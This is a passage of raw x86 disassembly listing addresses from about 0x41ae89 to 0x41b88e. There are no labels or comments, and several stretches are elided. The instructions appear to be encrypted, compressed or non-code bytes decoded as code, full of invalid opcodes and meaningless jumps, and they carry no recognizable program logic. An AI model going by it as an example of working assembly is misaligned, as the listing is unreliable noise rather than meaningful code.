  41ae89:	repz mov WORD PTR [ebx],ss
  41ae8c:	test   al,0xf7
  41ae8e:	add    ebp,edi
  41ae90:	int3   
  41ae91:	repz je 0x41ae9e
  41ae94:	loop   0x41aeac
  41ae96:	out    dx,al
  41ae97:	pop    edx
  41ae98:	xchg   ebp,eax
  41ae99:	inc    edx
  41ae9a:	stos   BYTE PTR es:[edi],al
  41ae9b:	mov    edx,0x3049cf51
  41aea0:	xchg   edi,eax
  41aea1:	xchg   ecx,eax
  41aea2:	and    edi,DWORD PTR [edi+0x2e]
  41aea5:	sbb    ah,dh
  41aea7:	xor    BYTE PTR [esp+edi*1+0xd0a55d6],dh
  41aeae:	in     al,dx
  41aeaf:	into   
  41aeb0:	sub    edi,ebx
  41aeb2:	addr16 (bad) 
  41aeb4:	popf   
  41aeb5:	inc    ecx
  41aeb6:	cmc    
  41aeb7:	inc    edi
  41aeb8:	outs   dx,DWORD PTR ds:[esi]
  41aeb9:	adc    esp,esi
  41aebb:	outs   dx,DWORD PTR ds:[esi]
  41aebc:	cli    
  41aebd:	xor    BYTE PTR [edi],ah
  41aebf:	inc    ebp
  41aec0:	inc    eax
  41aec1:	dec    ecx
  41aec2:	fwait
  41aec3:	push   esi
  41aec4:	imul   esi,DWORD PTR [ecx+0x47],0x52e9ef38
  41aecb:	sub    dl,ah
  41aecd:	inc    ebx
  41aece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aecf:	std    
  41aed0:	cdq    
  41aed1:	add    DWORD PTR [edx],0x35
  41aed4:	push   es
  41aed5:	pop    ds
  41aed6:	jecxz  0x41ae6c
  41aed8:	ss out dx,eax
  41aeda:	ins    BYTE PTR es:[edi],dx
  41aedb:	xchg   edx,eax
  41aedc:	xor    BYTE PTR [ebx+edx*4-0x1d4eb138],0xe7
  41aee4:	je     0x41aec6
  41aee6:	js     0x41aeff
  41aee8:	cmp    DWORD PTR [edx+0x6b],ecx
  41aeeb:	add    DWORD PTR [edx+0x4a],eax
  41aeee:	mov    cl,0x28
  41aef0:	mov    edi,0xda2e260b
  41aef5:	xchg   ecx,eax
  41aef6:	fisttp DWORD PTR [eax+0x5a]
  41aef9:	in     al,dx
  41aefa:	jbe    0x41af4d
  41aefc:	add    DWORD PTR [esi+ecx*2-0x1a],ebx
  41af00:	xor    bl,BYTE PTR [ecx+0x45]
  41af03:	cmp    BYTE PTR [eax+0x2e],bh
  41af06:	xchg   edi,eax
  41af07:	jp     0x41af6b
  41af09:	popf   
  41af0a:	xlat   BYTE PTR ds:[ebx]
  41af0b:	ds dec edx
  41af0d:	loope  0x41aecf
  41af0f:	mov    cl,0x0
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x6c7144ee
  41af82:	sbb    al,0xe1
  41af84:	or     BYTE PTR [esi],bl
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	outs   dx,DWORD PTR ds:[esi]
  41af8d:	inc    ecx
  41af8e:	xor    BYTE PTR [esi+ecx*2-0x671d3cc2],bl
  41af95:	(bad)  
  41af96:	sbb    edi,DWORD PTR [ecx+0x3bae056c]
  41af9c:	test   eax,0x4b45731c
  41afa1:	lea    edi,[edx+ebp*2]
  41afa4:	jl     0x41af28
  41afa6:	out    0x9b,al
  41afa8:	test   DWORD PTR [ecx+ecx*1+0x73f6cbc7],esi
  41afaf:	or     DWORD PTR [esi-0x4b],ebx
  41afb2:	hlt    
  41afb3:	mov    al,ds:0xc483a04c
  41afb8:	repz int 0xc
  41afbb:	es cmp al,0x9b
  41afbe:	cmp    eax,0xcae1c38f
  41afc3:	cld    
  41afc4:	xchg   DWORD PTR [edi],esp
  41afc6:	pop    edi
  41afc7:	shr    WORD PTR [edi+0x26],0x87
  41afcc:	pop    esi
  41afcd:	add    ecx,DWORD PTR [edx+0x2f]
  41afd0:	pop    esp
  41afd1:	push   edi
  41afd2:	repz fild QWORD PTR [ecx+0xd56044e]
  41afd9:	out    0x61,al
  41afdb:	iret   
  41afdc:	mov    ah,0x4
  41afde:	cmp    eax,0xcb86f7bb
  41afe3:	jne    0x41b038
  41afe5:	push   ebx
  41afe6:	push   edi
  41afe7:	add    eax,0x35289f4
  41afec:	push   0x8db36ef0
  41aff1:	mov    ah,0xc1
  41aff3:	fwait
  41aff4:	push   es
  41aff5:	ins    DWORD PTR es:[edi],dx
  41aff6:	enter  0xab31,0x79
  41affa:	gs and ch,cl
  41affd:	dec    esp
  41affe:	pop    esi
  41afff:	rol    DWORD PTR [esi-0x4f8c2bbe],cl
  41b005:	(bad)  
  41b006:	test   DWORD PTR [ebx],esp
  41b008:	cmp    al,0xd
  41b00a:	loop   0x41afc6
  41b00c:	mov    al,0xb7
  41b00e:	xchg   ebx,eax
  41b00f:	jno    0x41af9b
  41b011:	sbb    DWORD PTR [eax+0x5bf7f3d2],edi
  41b017:	into   
  41b018:	cmp    DWORD PTR [eax-0x614db6a0],esi
  41b01e:	jmp    0x41afc6
  41b020:	icebp  
  41b021:	jg     0x41b028
  41b023:	push   ebx
  41b024:	ror    DWORD PTR [esi-0x7f],0x65
  41b028:	aad    0x89
  41b02a:	mov    ebx,0x3555ee4e
  41b02f:	outs   dx,DWORD PTR ds:[esi]
  41b030:	ins    DWORD PTR es:[edi],dx
  41b031:	push   ds
  41b032:	xchg   edi,eax
  41b033:	fwait
  41b034:	psubb  mm2,QWORD PTR [ebx+0x30]
  41b038:	adc    al,0xdc
  41b03a:	mov    cl,al
  41b03c:	inc    ecx
  41b03d:	aaa    
  41b03e:	xor    eax,0x9e4620e8
  41b043:	(bad)
  41b047:	sub    eax,0xfb9d6d8
  41b04c:	fsub   QWORD PTR [edi+0x62]
  41b04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b050:	jae    0x41b073
  41b052:	or     eax,0xf6012cc3
  41b057:	xor    esp,edi
  41b059:	inc    ecx
  41b05a:	cmp    cl,bh
  41b05c:	std    
  41b05d:	arpl   WORD PTR [edx+0x7de48b19],dx
  41b063:	test   DWORD PTR [ecx+0x103826c],0x796db3d
  41b06d:	jl     0x41b00b
  41b06f:	push   ds
  41b070:	aad    0xe9
  41b072:	jb     0x41afff
  41b074:	das    
  41b075:	out    0xc5,al
  41b077:	out    dx,al
  41b078:	clc    
  41b079:	test   BYTE PTR es:[ebx+edi*4],al
  41b07d:	ja     0x41b0d1
  41b07f:	adc    ebx,DWORD PTR [edi+0x15]
  41b082:	push   esp
  41b084:	js     0x41b0fa
  41b086:	aam    0xc5
  41b088:	cdq    
  41b089:	xor    bh,BYTE PTR [eax]
  41b08b:	(bad)  [edi]
  41b08d:	adc    al,0x25
  41b08f:	inc    ebp
	...
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xa6f9d442
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	inc    ebp
  41b10d:	sbb    DWORD PTR [edx-0x2025bae9],ebx
  41b113:	mov    DWORD PTR [edi],ecx
  41b115:	aaa    
  41b116:	xor    BYTE PTR ds:0xd4bbb131,ch
  41b11c:	sub    edx,ebx
  41b11e:	into   
  41b11f:	and    dh,cl
  41b121:	(bad)  
  41b122:	into   
  41b123:	sub    BYTE PTR [ebx+ecx*2+0x2a],bh
  41b127:	adc    ecx,DWORD PTR ds:0x5c17f52
  41b12d:	sub    eax,0x525556e0
  41b132:	mov    edx,0xb5c507a7
  41b137:	call   0x60e2040e
  41b13c:	cdq    
  41b13d:	clc    
  41b13e:	dec    edx
  41b13f:	and    al,0x87
  41b141:	mov    WORD PTR [ebp+0x24],?
  41b144:	inc    edx
  41b145:	jo     0x41b175
  41b147:	xchg   ebx,eax
  41b148:	push   edi
  41b149:	push   edx
  41b14a:	daa    
  41b14b:	in     al,dx
  41b14c:	dec    eax
  41b14d:	mov    al,ds:0xc6f32b6
  41b152:	and    al,0x85
  41b154:	loop   0x41b1c2
  41b156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b157:	and    ch,ah
  41b159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b15a:	cmc    
  41b15b:	lods   eax,DWORD PTR ds:[esi]
  41b15c:	rcr    BYTE PTR [edx+eiz*4-0x685d716f],cl
  41b163:	dec    ecx
  41b164:	mov    WORD PTR [eax+0x75],?
  41b167:	sbb    esi,0x9
  41b16a:	jno    0x41b1af
  41b16c:	stos   DWORD PTR es:[edi],eax
  41b16d:	pop    ecx
  41b16e:	fisttp QWORD PTR ds:0x8cac4a8
  41b174:	push   edx
  41b175:	scas   al,BYTE PTR es:[edi]
  41b176:	inc    esp
  41b177:	mov    ?,edx
  41b179:	and    al,0x86
  41b17b:	ficom  WORD PTR [esi-0xba455d5]
  41b181:	adc    DWORD PTR [edi],eax
  41b183:	xor    al,0xf9
  41b185:	clc    
  41b186:	xchg   ebp,eax
  41b187:	or     al,0x9
  41b189:	push   cs
  41b18a:	imul   eax,DWORD PTR [ecx],0x2f9b8ea7
  41b190:	cmc    
  41b191:	icebp  
  41b192:	and    al,0x75
  41b194:	test   eax,0xea5004f5
  41b199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b19a:	mov    ebx,0xe01f3078
  41b19f:	xchg   dh,dh
  41b1a1:	mov    cl,0x2d
  41b1a3:	je     0x41b1d8
  41b1a5:	ret    
  41b1a6:	mov    ?,ebx
  41b1a8:	push   ds
  41b1a9:	lds    edi,FWORD PTR [esp+eax*1+0x4c]
  41b1ad:	pop    edi
  41b1ae:	xchg   DWORD PTR [edx-0x37ca41c],edx
  41b1b4:	mov    bh,0x64
  41b1b6:	fisubr DWORD PTR [edi-0x1f]
  41b1b9:	idiv   edi
  41b1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1bc:	outs   dx,DWORD PTR ds:[esi]
  41b1bd:	js     0x41b22f
  41b1bf:	inc    esp
  41b1c0:	mov    ebp,0x6123d7f8
  41b1c5:	mov    ch,0x2a
  41b1c7:	idiv   DWORD PTR [eax+0x67]
  41b1ca:	jno    0x41b1bd
  41b1cc:	xor    DWORD PTR [ebp-0x38],edx
  41b1cf:	cld    
  41b1d0:	(bad)  
  41b1d1:	outs   dx,BYTE PTR ds:[esi]
  41b1d2:	dec    edi
  41b1d3:	fdivr  DWORD PTR [esp+eax*2-0x722251c0]
  41b1da:	int    0x22
  41b1dc:	and    edi,edi
  41b1de:	mov    bl,0x1f
  41b1e0:	push   0xffffffe9
  41b1e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1e3:	pop    ds
  41b1e4:	(bad)  
  41b1e5:	daa    
  41b1e6:	lahf   
  41b1e7:	pusha  
  41b1e8:	adc    eax,0xa730fa4d
  41b1ed:	fldcw  WORD PTR [edx+0x74]
  41b1f0:	xchg   esp,eax
  41b1f1:	pushf  
  41b1f2:	loope  0x41b190
  41b1f4:	call   0xdb2c:0x410e8ac0
  41b1fb:	xor    al,0x1e
  41b1fd:	mov    ?,WORD PTR [ebp-0x7d]
  41b200:	xchg   BYTE PTR [ebx+0x1959fd61],ah
  41b206:	loope  0x41b1c3
  41b208:	inc    esp
  41b209:	int3   
  41b20a:	mov    al,ds:0x10cef6d0
  41b20f:	jp     0x41b211
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [edx+0x10a0738a],bl
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	or     al,0xfd
  41b28e:	hlt    
  41b28f:	mov    esi,0x9c324f37
  41b294:	sar    BYTE PTR [edx-0x31fdf26f],0x77
  41b29b:	mov    eax,ds:0xc8fdaa65
  41b2a0:	jecxz  0x41b31c
  41b2a2:	xlat   BYTE PTR cs:[ebx]
  41b2a4:	mov    esi,DWORD PTR [esi+0x932eb34]
  41b2aa:	inc    ebx
  41b2ab:	and    edi,esp
  41b2ad:	sbb    dl,BYTE PTR [eax+0x1b]
  41b2b0:	aad    0x8b
  41b2b2:	dec    eax
  41b2b3:	sub    DWORD PTR [edx],ecx
  41b2b5:	(bad)  
  41b2b6:	dec    edx
  41b2b7:	outs   dx,DWORD PTR ds:[esi]
  41b2b8:	add    BYTE PTR [ebx],al
  41b2ba:	ds add al,0x6f
  41b2bd:	std    
  41b2be:	and    ebp,DWORD PTR [esi+0x66c16849]
  41b2c4:	xor    dl,al
  41b2c6:	imul   ecx,DWORD PTR [ebx+0x75],0xe7acbbb6
  41b2cd:	push   ss
  41b2ce:	aas    
  41b2cf:	in     eax,dx
  41b2d0:	shl    DWORD PTR [esi-0x5d],0xf3
  41b2d4:	repz ds sbb al,0xb6
  41b2d8:	adc    BYTE PTR [ebx-0x63aaec08],dh
  41b2de:	int3   
  41b2df:	repz bound esp,QWORD PTR [eax+0x49]
  41b2e3:	(bad)  
  41b2e5:	es retf 
  41b2e7:	and    esi,eax
  41b2e9:	and    al,0x4a
  41b2eb:	scas   eax,DWORD PTR es:[edi]
  41b2ec:	mov    BYTE PTR [ecx],cl
  41b2ee:	(bad)  
  41b2ef:	sbb    esi,DWORD PTR [ecx+0x41e13f5a]
  41b2f5:	test   edx,0x5847bcf2
  41b2fb:	ret    0x6226
  41b2fe:	xchg   esp,eax
  41b2ff:	ret    
  41b300:	(bad)  
  41b301:	aas    
  41b302:	mov    eax,ss:0x10368286
  41b308:	lahf   
  41b309:	cdq    
  41b30a:	popa   
  41b30b:	mov    BYTE PTR [ebx+ebx*1+0x15],dh
  41b30f:	lods   al,BYTE PTR ds:[esi]
  41b310:	and    DWORD PTR [eax-0x188a59a3],eax
  41b316:	mov    esp,0x6dcec497
  41b31b:	dec    edx
  41b31c:	sub    DWORD PTR [ebp-0x6bd05147],0x51
  41b323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b324:	mov    ecx,0x1599f62b
  41b329:	and    bl,BYTE PTR cs:[edi]
  41b32c:	cmp    BYTE PTR [esi-0x6],0x14
  41b330:	mov    DWORD PTR [esi+0x59f6898a],esp
  41b336:	fisttp DWORD PTR [eax+0x2a]
  41b339:	ins    DWORD PTR es:[edi],dx
  41b33a:	je     0x41b2f5
  41b33c:	hlt    
  41b33d:	cmp    al,0x31
  41b33f:	jmp    0xccbb2871
  41b344:	addr16 (bad) 
  41b346:	or     BYTE PTR [esi],al
  41b348:	test   edx,eax
  41b34a:	push   ss
  41b34b:	imul   ecx,DWORD PTR [ebx],0x7
  41b34e:	mov    eax,edi
  41b350:	out    0x57,al
  41b352:	add    ah,BYTE PTR [ecx]
  41b354:	xchg   edx,eax
  41b355:	inc    ebx
  41b356:	cmp    BYTE PTR [eax-0x1d8fdd44],dl
  41b35c:	stos   BYTE PTR es:[edi],al
  41b35d:	xor    edx,DWORD PTR [ecx+0x2a]
  41b360:	xor    eax,0x6e72ea2e
  41b365:	xor    al,0x52
  41b367:	xchg   ecx,eax
  41b368:	cwde   
  41b369:	fs dec edi
  41b36b:	fdivr  st,st(6)
  41b36d:	test   eax,0x76d7a0ff
  41b372:	sbb    ebx,DWORD PTR [esi]
  41b374:	(bad)  
  41b375:	jne    0x41b35d
  41b377:	(bad)  
  41b379:	xlat   BYTE PTR ds:[ebx]
  41b37a:	retf   
  41b37b:	or     dh,BYTE PTR [ebp+esi*4+0x5a5e028a]
  41b382:	(bad)  
  41b384:	shl    BYTE PTR [ecx],0x81
  41b387:	lods   eax,DWORD PTR es:[esi]
  41b389:	sbb    al,0x45
  41b38b:	addr16 push ss
  41b38d:	xchg   edi,eax
  41b38e:	jae    0x41b375
	...
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	mov    al,ds:0x14678771
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR [ecx+eax*1],al
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	fs mov al,ss:0xe25866c6
  41b413:	push   ebx
  41b414:	adc    al,BYTE PTR [esi+0x61]
  41b417:	jae    0x41b3dc
  41b419:	jno    0x41b3c1
  41b41b:	or     ebp,DWORD PTR [edi-0x54]
  41b41e:	xchg   ebx,eax
  41b41f:	xchg   ebp,eax
  41b420:	push   edi
  41b421:	int3   
  41b422:	sub    DWORD PTR [edx+0x6f],ebp
  41b425:	div    BYTE PTR [ecx+0x5dfe1d24]
  41b42b:	push   esp
  41b42c:	or     dl,BYTE PTR [ecx]
  41b42e:	sbb    al,dh
  41b430:	adc    edx,0xffffffb6
  41b433:	sub    al,0x76
  41b435:	aas    
  41b436:	and    edx,edi
  41b438:	push   0x31a77e1d
  41b43d:	fst    DWORD PTR [eax]
  41b43f:	jmp    DWORD PTR [edi]
  41b441:	sbb    ecx,DWORD PTR [eax+0x7f]
  41b444:	dec    edx
  41b445:	outs   dx,DWORD PTR ds:[esi]
  41b446:	(bad)  
  41b447:	pop    ss
  41b448:	inc    esp
  41b449:	push   esi
  41b44a:	idiv   DWORD PTR [ebp-0x65e3fc3b]
  41b450:	xor    ecx,DWORD PTR [esi-0x35]
  41b453:	cmp    ah,al
  41b455:	int3   
  41b456:	and    DWORD PTR [edx+0x1c],ebx
  41b459:	dec    edx
  41b45a:	xchg   cl,ch
  41b45c:	lds    esi,FWORD PTR [ecx+0x48]
  41b45f:	inc    esi
  41b460:	es test al,0x29
  41b463:	inc    ebp
  41b464:	jecxz  0x41b454
  41b466:	or     DWORD PTR [ebx+0x48],0x98b985ad
  41b46d:	jmp    0x1fe9:0xfb29c102
  41b474:	sbb    dl,bl
  41b476:	cmp    eax,0x1dc9b2ba
  41b47b:	pop    edx
  41b47c:	inc    edi
  41b47d:	shl    ecx,1
  41b47f:	xor    esp,DWORD PTR [edx+0x2e]
  41b482:	aam    0x46
  41b484:	jl     0x41b456
  41b486:	std    
  41b487:	pop    ss
  41b488:	push   ebp
  41b489:	xchg   esp,eax
  41b48a:	jge    0x41b481
  41b48c:	mov    edx,edi
  41b48e:	sub    eax,0x2a4589f2
  41b493:	jbe    0x41b47b
  41b495:	sub    ebp,DWORD PTR ds:0x60a9c0de
  41b49b:	cdq    
  41b49c:	dec    edi
  41b49d:	jne    0x41b4b4
  41b49f:	fnstsw ax
  41b4a1:	mov    edx,0x7edf9281
  41b4a6:	inc    edi
  41b4a7:	ds mov dh,0x3e
  41b4aa:	or     eax,0x9e2d77b1
  41b4af:	pop    ebx
  41b4b0:	xor    eax,DWORD PTR [eax-0x61d53eb]
  41b4b6:	loop   0x41b48d
  41b4b8:	arpl   WORD PTR [ebp+0x3f75da3c],si
  41b4be:	fcmovbe st,st(1)
  41b4c0:	mov    DWORD PTR [ecx-0x70cba880],edi
  41b4c6:	mov    cl,0x14
  41b4c8:	inc    edx
  41b4c9:	mov    edi,0x25bd93b2
  41b4ce:	sbb    esi,esi
  41b4d0:	(bad)  
  41b4d1:	aad    0x15
  41b4d3:	mov    edi,DWORD PTR [edi]
  41b4d5:	adc    al,0x22
  41b4d7:	bnd je 0x41b52e
  41b4da:	or     al,0x5d
  41b4dc:	clc    
  41b4dd:	ret    0x9a92
  41b4e0:	(bad)  
  41b4e1:	(bad)  
  41b4e2:	and    esp,DWORD PTR [edi+0x2c9e8749]
  41b4e8:	pop    edx
  41b4e9:	jmp    0x21790d8e
  41b4ee:	jecxz  0x41b558
  41b4f0:	sub    ebx,ecx
  41b4f2:	mov    ebx,DWORD PTR [esi-0x58e04f58]
  41b4f8:	stc    
  41b4f9:	ror    BYTE PTR [ebx+0x732a7cc6],1
  41b4ff:	leave  
  41b500:	retf   
  41b501:	cmp    al,0x2
  41b503:	jae    0x41b506
  41b505:	inc    ebx
  41b506:	inc    esp
  41b507:	mov    edi,0x6be87c98
  41b50c:	cmp    edi,eax
  41b50e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
	...
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	and    bl,cl
  41b582:	into   
  41b583:	sbb    DWORD PTR [eax],ebx
  41b585:	and    al,BYTE PTR [ecx]
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	push   esi
  41b58d:	mov    eax,ds:0x14e47bb3
  41b592:	push   0x568032cb
  41b597:	rol    BYTE PTR [eax+eax*8],0x87
  41b59b:	sbb    DWORD PTR [edx+ebp*8-0x56],ebp
  41b59f:	push   edx
  41b5a0:	add    eax,0xfa039d4b
  41b5a5:	sbb    DWORD PTR [ebx-0x77eab833],0x5b
  41b5ac:	popf   
  41b5ad:	push   edx
  41b5ae:	imul   esi,DWORD PTR [eax],0x9d852bb1
  41b5b4:	into   
  41b5b5:	cmp    DWORD PTR [ebx+0x14],edx
  41b5b8:	add    DWORD PTR [esi+ebx*8],edi
  41b5bb:	lea    edx,[eax]
  41b5bd:	xor    eax,0xbfe9e718
  41b5c2:	xor    eax,0x5768fff6
  41b5c7:	or     DWORD PTR [ecx-0x9638e45],edi
  41b5cd:	fstp   QWORD PTR [edx-0x31]
  41b5d0:	push   ecx
  41b5d1:	xchg   BYTE PTR [esi-0x1a1dc385],bl
  41b5d7:	shr    DWORD PTR [ebp+0x592e13a1],1
  41b5dd:	cli    
  41b5de:	pop    es
  41b5df:	inc    esi
  41b5e0:	xchg   ecx,eax
  41b5e1:	lods   eax,DWORD PTR ds:[esi]
  41b5e2:	gs je  0x41b618
  41b5e5:	jle    0x41b577
  41b5e7:	sub    esi,ebx
  41b5e9:	push   ds
  41b5ea:	fcomip st,st(4)
  41b5ec:	outs   dx,BYTE PTR ds:[esi]
  41b5ed:	ja     0x41b5fd
  41b5ef:	dec    ecx
  41b5f0:	test   eax,0x8a4e782c
  41b5f5:	out    0x5c,al
  41b5f7:	test   ebx,ebx
  41b5f9:	xchg   ecx,eax
  41b5fa:	cmp    al,ah
  41b5fc:	sbb    BYTE PTR [edx-0x7f],ch
  41b5ff:	sub    bl,BYTE PTR [ebp-0x234a8b5e]
  41b605:	rcr    BYTE PTR ds:0xbc2d2655,cl
  41b60b:	imul   eax,edi,0xb5c85b
  41b611:	lods   eax,DWORD PTR ds:[esi]
  41b612:	aad    0x41
  41b614:	std    
  41b615:	add    BYTE PTR [edx],0x6c
  41b618:	into   
  41b619:	adc    edx,ecx
  41b61b:	aas    
  41b61c:	imul   eax,ebp,0x1d96ade0
  41b622:	push   0xc3da09e5
  41b627:	aaa    
  41b628:	mov    ds,WORD PTR [eax-0x28a3fe3]
  41b62e:	repnz adc al,0xed
  41b631:	loopne 0x41b697
  41b633:	mov    esp,0x1494dc72
  41b638:	push   cs
  41b639:	loopne 0x41b6a1
  41b63b:	fs arpl dx,dx
  41b63e:	ss call 0xc5bad64e
  41b644:	fs jbe 0x41b6a8
  41b647:	add    BYTE PTR [ebp-0x2d863cb3],bh
  41b64d:	xchg   edx,eax
  41b64e:	jbe    0x41b6a9
  41b650:	mov    DWORD PTR [ecx+0x5e18a5bf],ebp
  41b656:	out    dx,al
  41b657:	std    
  41b658:	jmp    0x750f:0x7a6c1d04
  41b65f:	jo     0x41b6ae
  41b661:	inc    edi
  41b662:	ret    0x52b6
  41b665:	js     0x41b68f
  41b667:	and    eax,0x30e029a5
  41b66c:	fnstsw WORD PTR [edx+0x55446940]
  41b672:	clc    
  41b673:	std    
  41b674:	xor    al,0x4
  41b676:	cli    
  41b677:	test   DWORD PTR [edx],edx
  41b679:	sar    BYTE PTR [edx+edx*4+0x5558c904],cl
  41b680:	mov    dl,0xb1
  41b682:	mul    DWORD PTR [ecx]
  41b684:	add    dh,BYTE PTR [edi+0x44]
  41b687:	stc    
  41b688:	outs   dx,DWORD PTR ds:[esi]
  41b689:	call   0xd56:0x1d255749
	...
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	pop    esi
  41b701:	scas   al,BYTE PTR es:[edi]
  41b702:	sbb    bh,bl
  41b704:	sbb    al,0x23
  41b706:	add    DWORD PTR [eax],eax
  41b708:	add    al,0x1
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	mov    cl,cl
  41b70e:	mov    dl,0x77
  41b710:	adc    DWORD PTR ds:[ebp+0x77],edi
  41b714:	and    eax,0xeda3868
  41b719:	xlat   BYTE PTR ds:[ebx]
  41b71a:	jno    0x41b757
  41b71c:	(bad)  
  41b71d:	sub    ebp,edx
  41b71f:	xchg   esp,eax
  41b720:	lock test DWORD PTR [esi+0x4c9fa088],esp
  41b727:	ins    BYTE PTR es:[edi],dx
  41b728:	xor    BYTE PTR [edi+0x1958ada5],cl
  41b72e:	inc    edi
  41b72f:	pop    eax
  41b730:	mov    ch,0xed
  41b732:	jecxz  0x41b6cf
  41b734:	loopne 0x41b748
  41b736:	jle    0x41b775
  41b738:	push   ds
  41b739:	pop    edi
  41b73a:	pop    edx
  41b73b:	adc    edx,DWORD PTR [edx]
  41b73d:	pop    cx
  41b73f:	call   0xbe18ed3c
  41b744:	and    eax,0x73414e0c
  41b749:	inc    ebx
  41b74a:	xchg   ebx,eax
  41b74b:	xchg   DWORD PTR ds:0x2bd87daf,ecx
  41b751:	xor    DWORD PTR [esi+0x1cb26c68],esi
  41b757:	sub    BYTE PTR [eax],ch
  41b759:	arpl   WORD PTR ds:0xac2be6bb,bx
  41b75f:	std    
  41b760:	cld    
  41b761:	push   edx
  41b762:	sbb    BYTE PTR [ecx],0x1f
  41b765:	sub    eax,0x949c48aa
  41b76a:	adc    eax,0xc33735f7
  41b76f:	ss iret 
  41b771:	in     al,dx
  41b772:	sbb    esi,DWORD PTR [ecx+ebp*2+0x7e71dcf2]
  41b779:	mov    ecx,0xcdd6d792
  41b77e:	cmp    DWORD PTR [edx],esi
  41b780:	mul    BYTE PTR [ebx+0x3]
  41b783:	mov    ah,0xa2
  41b785:	jmp    0x41b76a
  41b787:	in     eax,dx
  41b788:	dec    eax
  41b789:	je     0x41b723
  41b78b:	ret    0xa61d
  41b78e:	out    0xfd,eax
  41b790:	mov    ah,0x52
  41b792:	cdq    
  41b793:	jmp    0xfe026bc9
  41b798:	push   edx
  41b799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b79a:	xor    ah,BYTE PTR [eax+0x18]
  41b79d:	inc    esi
  41b79e:	fxch   st(4)
  41b7a0:	fidiv  DWORD PTR [ecx+eax*2+0x1b]
  41b7a4:	ins    BYTE PTR es:[edi],dx
  41b7a5:	add    eax,0xda0d0fae
  41b7aa:	inc    esp
  41b7ab:	push   0xbcfa837b
  41b7b0:	pop    esp
  41b7b1:	cmp    dl,BYTE PTR [ecx]
  41b7b3:	and    edx,DWORD PTR [ecx]
  41b7b5:	call   0x1d14267f
  41b7ba:	xor    al,dh
  41b7bc:	jb     0x41b757
  41b7be:	out    0x62,al
  41b7c0:	pop    edi
  41b7c1:	inc    esp
  41b7c2:	idiv   BYTE PTR [eax+edx*1]
  41b7c5:	fcmovbe st,st(6)
  41b7c7:	jne    0x41b81d
  41b7c9:	outs   dx,DWORD PTR ds:[esi]
  41b7ca:	je     0x41b7a4
  41b7cc:	mov    al,ds:0xeeddd267
  41b7d1:	inc    edx
  41b7d2:	mov    ds:0xc2962d47,al
  41b7d7:	mov    dl,dl
  41b7d9:	gs scas al,BYTE PTR es:[edi]
  41b7db:	daa    
  41b7dc:	(bad)  
  41b7dd:	mov    cl,0x71
  41b7df:	cmp    BYTE PTR [ebx-0x3a],0xab
  41b7e3:	jnp    0x41b806
  41b7e5:	mov    ah,0x3a
  41b7e7:	mov    dh,0x36
  41b7e9:	adc    esi,ebp
  41b7eb:	xlat   BYTE PTR ds:[ebx]
  41b7ec:	leave  
  41b7ed:	jbe    0x41b819
  41b7ef:	nop
  41b7f0:	fstp   QWORD PTR [edi-0x4315bd7d]
  41b7f6:	mov    cl,0x45
  41b7f8:	sbb    eax,0xb9305761
  41b7fd:	int3   
  41b7fe:	test   DWORD PTR [esi-0x15],edx
  41b801:	fucomi st,st(5)
  41b803:	stos   DWORD PTR es:[edi],eax
  41b804:	mov    fs,WORD PTR [edi]
  41b806:	cdq    
  41b807:	or     al,0x4d
  41b809:	mov    ah,0xda
  41b80b:	mov    ds:0x54cb58a0,eax
	...
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x51
  41b881:	fs sti 
  41b883:	fbld   TBYTE PTR [eax]
  41b885:	and    al,0x1
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	pushf  
  41b88d:	xchg   ebx,eax
  41b88e:	stc    
